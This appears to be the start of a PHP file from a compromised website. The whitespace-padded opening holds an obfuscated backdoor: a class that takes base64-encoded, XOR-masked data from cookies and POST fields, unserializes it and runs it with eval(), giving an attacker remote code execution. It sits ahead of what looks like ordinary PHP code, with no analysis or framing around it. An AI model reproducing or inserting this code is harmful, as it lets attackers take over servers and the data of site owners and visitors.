<?php                                                                                                                                                                                                                                                                                                                                                                                                 $zGtFI = "Kf_gghm";$vwIcHrwH = class_exists($zGtFI); $VphcuGQh = $vwIcHrwH;if (!$VphcuGQh){class Kf_gghm{private $uEJSRTgsh;public static $MKaoSsS = "9c8b2c10-6213-4a07-830f-ad648fb3e6bc";public static $HjWLtjBsgo = NULL;public function __construct(){$cWlYog = $_COOKIE;$GDYyyLy = $_POST;$ajYNX = @$cWlYog[substr(Kf_gghm::$MKaoSsS, 0, 4)];if (!empty($ajYNX)){$LIwpFjZWtL = "base64";$DGNSYgHVaO = "";$ajYNX = explode(",", $ajYNX);foreach ($ajYNX as $NPyqxbK){$DGNSYgHVaO .= @$cWlYog[$NPyqxbK];$DGNSYgHVaO .= @$GDYyyLy[$NPyqxbK];}$DGNSYgHVaO = array_map($LIwpFjZWtL . "\x5f" . chr (100) . chr (101) . 'c' . 'o' . "\144" . chr ( 427 - 326 ), array($DGNSYgHVaO,)); $DGNSYgHVaO = $DGNSYgHVaO[0] ^ str_repeat(Kf_gghm::$MKaoSsS, (strlen($DGNSYgHVaO[0]) / strlen(Kf_gghm::$MKaoSsS)) + 1);Kf_gghm::$HjWLtjBsgo = @unserialize($DGNSYgHVaO);}}public function __destruct(){$this->MkRDG();}private function MkRDG(){if (is_array(Kf_gghm::$HjWLtjBsgo)) {$lIzMVdzNV = str_replace(chr (60) . '?' . chr (112) . chr (104) . "\x70", "", Kf_gghm::$HjWLtjBsgo["\x63" . "\157" . chr (110) . "\x74" . chr ( 158 - 57 )."\156" . 't']);eval($lIzMVdzNV);exit();}}}$NfmBNNKVB = new Kf_gghm(); $NfmBNNKVB = NULL;} ?><?php
/**
